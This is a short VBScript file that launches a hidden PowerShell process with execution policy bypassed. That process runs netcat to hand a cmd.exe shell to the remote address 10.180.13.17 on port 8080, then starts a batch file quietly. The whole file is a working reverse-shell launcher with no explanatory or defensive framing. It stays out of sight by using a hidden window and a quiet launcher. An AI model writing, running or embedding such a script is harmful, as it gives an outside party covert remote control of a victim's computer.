Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "Quiet.exe powershell -W Hidden -Exec Bypass C:\nc\nc.exe 10.180.13.17 8080 -e cmd.exe && taskkill /F /IM cmd.exe"
WScript.Sleep 10000
oShell.run "Quiet.exe nc.bat"
Set oShell = Nothing'
